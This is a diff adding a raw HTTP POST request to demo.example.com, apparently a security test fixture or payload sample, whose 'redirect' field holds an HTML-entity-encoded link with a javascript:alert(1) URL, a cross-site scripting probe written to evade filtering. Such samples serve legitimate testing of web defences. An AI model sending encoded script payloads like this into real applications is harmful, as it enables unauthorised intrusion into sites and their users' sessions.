@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+Connection: close
+
+redirect=&#x3C;a href=&#x22;javascript:alert(1)&#x22;&#x3E;x&#x3C;/a&#x3E;
